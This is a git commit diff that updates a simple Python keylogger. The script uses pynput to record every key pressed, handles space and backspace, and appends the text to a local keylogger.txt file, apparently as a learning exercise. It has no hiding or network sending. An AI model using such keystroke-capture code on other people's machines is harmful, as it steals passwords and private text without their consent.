4cb6aecc103dbc7ec7a2c28a8cdf79c9379d936b
masoud-saeed16 <masoudsaeedgariba16@gmail.com>
2024-03-30 10:25:39 +0000

    Final Work

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,34 @@
 from pynput import keyboard
 
 def recording_keystrokes(key):
-    try:
-        character = key.char
-    except AttributeError:
-        print("Couldn't retrieve character")
-        return
+  
+  try:
+    if key == keyboard.Key.space:
+      character = ' '
     
-    with open("keylogger.txt", 'w') as logging_file:
-        logging_file.write(character)
+    elif key == keyboard.Key.backspace:
+      
+      with open("keylogger.txt", 'r+') as logging_file:  
+        contents = logging_file.read()[:-1]  
+        logging_file.seek(0)  
+        logging_file.write(contents)
+      return 
+    
+    else:
+      character = key.char
+
+    with open("keylogger.txt", 'a') as logging_file:
+      logging_file.write(character)
+      logging_file.write('') 
+
+  except (AttributeError, FileNotFoundError) as e:
+    print("Error:", e)
 
 if __name__ == '__main__':
+  
+  try:
     with keyboard.Listener(on_press=recording_keystrokes) as listener:
-        listener.join()
+      listener.join()
+
+  except Exception as e:
+    print("An error occurred:", e)
